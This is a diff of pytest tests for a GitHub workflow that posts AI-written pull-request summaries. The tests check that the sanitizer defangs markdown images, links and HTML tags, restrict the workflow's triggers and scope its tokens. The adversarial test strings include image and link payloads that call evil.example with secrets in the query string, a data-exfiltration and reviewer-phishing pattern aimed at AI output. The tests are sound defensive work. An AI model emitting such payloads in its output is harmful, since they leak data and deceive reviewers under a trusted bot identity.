@@ -624,6 +624,90 @@ def test_ai_text_cannot_forge_a_marker_or_a_mention():
     assert sanitize("x" * 300, 100).endswith("… _(truncated)_")
 
 
+def test_ai_text_strips_markdown_images_and_links():
+    """#373: markdown image/link syntax must not survive into the comment.
+
+    `![](url)` is fetched server-side by GitHub's camo proxy the moment the
+    comment renders -- a request to an attacker-controlled host that confirms
+    the workflow ran and when. `[text](url)`, a reference-style `[label]: url`
+    definition, an autolink, and an HTML `<img>` are all the same
+    reviewer-phishing primitive under a trusted bot identity. Adversarial
+    inputs: reference-style links, nested brackets, `![]()`, autolinks, HTML
+    `<img>`, and a URL that smuggles a token in its query string.
+    """
+    content = "\n".join(_read_lines(SCRIPT_PATH))
+
+    # Pin the JS itself, not only the Python model of it below. Without these,
+    # deleting the escaping from prod-igy.js leaves this test green -- the
+    # re-implementation would happily keep testing itself.
+    body = content[content.index("function sanitizeAiText(") :]
+    body = body[: body.index("\n}")]
+    assert "s.replace(/<img\\b/gi, '&lt;img')" in body, "HTML <img> escaping was removed"
+    assert "s.replace(/!\\[/g, '!' + ZWSP + '[')" in body, "image-embed defanging was removed"
+    assert "s.replace(/\\]\\(/g, ']' + ZWSP + '(')" in body, (
+        "link/image-close defanging was removed"
+    )
+    assert "s.replace(/\\bhttps?:\\/\\//gi, (m) => m.replace('//', '/' + ZWSP + '/'))" in body, (
+        "bare-URL defanging was removed"
+    )
+
+    zwsp = "​"
+
+    def sanitize(text, max_chars=4000):
+        s = "" if text is None else str(text)
+        s = s.replace("<!--", "&lt;!--").replace("-->", "--&gt;")
+        s = re.sub(r"@(?=[A-Za-z0-9])", "@" + zwsp, s)
+        s = re.sub(r"<img\b", "&lt;img", s, flags=re.I)
+        s = s.replace("![", "!" + zwsp + "[")
+        s = s.replace("](", "]" + zwsp + "(")
+        s = re.sub(
+            r"\bhttps?://", lambda m: m.group(0).replace("//", "/" + zwsp + "/"), s, flags=re.I
+        )
+        if len(s) > max_chars:
+            s = s[:max_chars] + "… _(truncated)_"
+        return s.strip()
+
+    # Plain image embed with a token smuggled in the query string.
+    img = sanitize("Summary: ![pixel](https://evil.example/p.png?token=SECRET123) done.")
+    assert "![" not in img and "!" + zwsp + "[" in img
+    assert "](" not in img and "]" + zwsp + "(" in img
+    assert "://" not in img
+    assert "https:" + zwsp not in img  # zwsp lands between the slashes, not after the colon
+    assert "https:/" + zwsp + "/" in img
+    # The token text itself is not redacted -- only the link is neutralised.
+    assert "SECRET123" in img
+
+    # Nested brackets in the alt text must not hide the destination: only the
+    # two-character trigger sequences are matched, not a balanced-bracket span.
+    nested = sanitize("![alt with [nested] brackets](https://evil.example/?x=1)")
+    assert "![" not in nested and "](" not in nested
+    assert "://" not in nested
+
+    # An inline (non-image) link is the same primitive.
+    inline = sanitize("See [the details](https://evil.example/confirm) for context.")
+    assert "](" not in inline and "://" not in inline
+
+    # Reference-style: the destination lives in a separate definition line.
+    ref = sanitize("See [details][1] for more.\n\n[1]: https://evil.example/?token=SECRET")
+    assert "://" not in ref
+    assert "https:/" + zwsp + "/" in ref
+
+    # Autolink form.
+    auto = sanitize("Source: <https://evil.example/x>")
+    assert "://" not in auto
+
+    # HTML <img>, including a mixed-case tag name.
+    html_img = sanitize('Rendered via <img src="https://evil.example/?token=SECRET">.')
+    assert "<img" not in html_img
+    assert "&lt;img" in html_img
+    assert "://" not in html_img
+
+    # Ordinary prose that happens to mention a URL stays readable -- the fix
+    # breaks the scheme's `//`, it does not scrub every "http" substring.
+    prose = sanitize("Rewrites _lines() to drop the trailing CR.")
+    assert prose == "Rewrites _lines() to drop the trailing CR."
+
+
 def test_summary_step_does_exactly_two_things():
     """The schema is the whole contract, and it has two fields.
 
@@ -935,6 +1019,85 @@ def test_ai_prompt_frames_pr_text_as_data():
     # No tools: the model cannot read the repo or act, only return one object.
     call = content[start:]
     assert "tools:" not in call, "the AI step must not declare tools"
+
+
+def test_iss374_edited_does_not_retrigger_the_privileged_job():
+    """#374: `edited` fires whenever a PR's title or body changes -- which the
+    author (including a fork author) controls and can pull at will, against a
+    job holding pull-requests: write, issues: write and an API key. It must
+    not be in the trigger's `types:` list."""
+    content = "\n".join(_read_lines(WORKFLOW_PATH))
+    trigger = content.split("pull_request_target:", 1)[1].split("workflow_dispatch:", 1)[0]
+    types_line = next(line for line in trigger.split("\n") if "types:" in line)
+    types = re.search(r"types:\s*\[([^\]]*)\]", types_line)
+    assert types, types_line
+    values = [t.strip() for t in types.group(1).split(",")]
+    assert "edited" not in values, values
+    assert set(values) == {"opened", "synchronize", "reopened"}, values
+
+
+def test_iss375_app_token_probe_env_is_job_level_not_step_level():
+    """#375: the app-token step's `if:` used to read `env.HAS_APP_ID` /
+    `env.HAS_PRIVATE_KEY` from an `env:` block declared on that same step,
+    which works only if the step's own `env:` is guaranteed resolved before
+    its `if:` evaluates -- behaviour GitHub documents loosely. Promoting the
+    probes to job level removes the ordering question: every step's `if:`
+    reads the same job-level env the normal way.
+    """
+    content = "\n".join(_read_lines(WORKFLOW_PATH))
+
+    # HAS_APP_ID / HAS_PRIVATE_KEY appear once each, at job level -- between
+    # the job's `permissions:` block and its first step -- not inside the
+    # app-token step body.
+    job_start = content.index("  triage:")
+    steps_start = content.index("    steps:", job_start)
+    job_header = content[job_start:steps_start]
+    assert "HAS_APP_ID: ${{ secrets.PRODIGY_APP_ID }}" in job_header
+    assert "HAS_PRIVATE_KEY: ${{ secrets.PRODIGY_PRIVATE_KEY }}" in job_header
+
+    steps_body = content[steps_start:]
+    token_step_start = steps_body.index("Generate prod-igy token")
+    token_step_end = steps_body.index("\n\n", token_step_start)
+    token_step = steps_body[token_step_start:token_step_end]
+    # The step's `if:` still legitimately reads `env.HAS_APP_ID` /
+    # `env.HAS_PRIVATE_KEY` (now resolving against the job-level env checked
+    # above) -- what must be gone is a step-level `env:` block that assigns
+    # them, the pattern this issue moved away from.
+    assert "HAS_APP_ID: ${{ secrets.PRODIGY_APP_ID }}" not in token_step, (
+        "the probe env must not remain step-level"
+    )
+    assert "HAS_PRIVATE_KEY: ${{ secrets.PRODIGY_PRIVATE_KEY }}" not in token_step, (
+        "the probe env must not remain step-level"
+    )
+    assert "\n        env:" not in token_step, "the step must not declare its own env: block"
+
+    # The gate itself is unchanged.
+    assert "if: ${{ env.HAS_APP_ID != '' && env.HAS_PRIVATE_KEY != '' }}" in content
+
+
+def test_iss375_the_fallback_identity_is_logged():
+    """#375 (acceptance): the GITHUB_TOKEN fallback is no longer silent --
+    a run log line says which identity is posting."""
+    content = "\n".join(_read_lines(WORKFLOW_PATH))
+    assert "steps.app-token.outputs.token" in content
+    assert "::notice::" in content
+    assert "github-actions[bot]" in content
+    assert "GITHUB_TOKEN fallback" in content
+
+
+def test_github_app_token_is_scoped_to_the_job_permissions():
+    """The app token must not inherit the App installation's full permission
+    grant. Every `permission-<name>` input mirrors the job's own
+    `permissions:` block exactly, so the token can never do more than the job
+    that requests it is already allowed to."""
+    content = "\n".join(_read_lines(WORKFLOW_PATH))
+    start = content.index("Generate prod-igy token")
+    end = content.index("\n\n", start)
+    step = content[start:end]
+    assert "permission-contents: read" in step
+    assert "permission-pull-requests: write" in step
+    assert "permission-issues: write" in step
+    assert "permission-checks: read" in step
 
 
 def test_ai_diff_budget_is_per_file():
